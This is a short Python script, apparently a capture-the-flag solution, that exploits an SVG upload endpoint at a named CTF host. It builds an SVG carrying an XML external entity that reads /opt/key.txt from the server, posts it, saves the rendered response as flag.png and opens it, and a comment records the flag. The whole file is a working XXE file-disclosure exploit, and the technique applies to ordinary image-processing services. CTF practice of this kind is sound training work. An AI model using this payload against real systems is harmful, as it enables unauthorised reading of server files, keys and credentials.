#!/usr/bin/env python3
import os
import requests as r

url = 'http://hackfest.redrocket.club:31341'

req = r.Session()

# Payload Options
target_file   = "/opt/key.txt"
width, height = "1175px", "75px"
background    = "#111927"
color         = "#9fef00"
fontFamily    = "Terminal"
fontSize      = 32

# Crafting Payload
payload  = f'<?xml version="1.0"?>'
payload += f'<!DOCTYPE foo ['
payload += f'<!ENTITY xxe SYSTEM "file://{target_file}" >]>'
payload += f'<svg width="{width}" height="{height}">'
payload += f'<rect width="100%" height="100%" fill="{background}"/>'
payload += f'<text font-family="{fontFamily}" font-size="{str(fontSize)}" '
payload += f'x="10" y="48" fill="{color}" text-rendering="optimizeLegibility">&xxe;</text>'
payload += f'</svg>'

# Send payload
file = {'file': payload}
res = req.post(url, files=file)

if not os.path.exists('./flag.png'):
    # Write response as flag.png
    open('flag.png','wb').write(res.content)

# Open flag.png
os.system('open flag.png') # flag{https://www.youtube.com/watch?v=e5nyQmaq4k4#N1c3W0rk!}
exit()
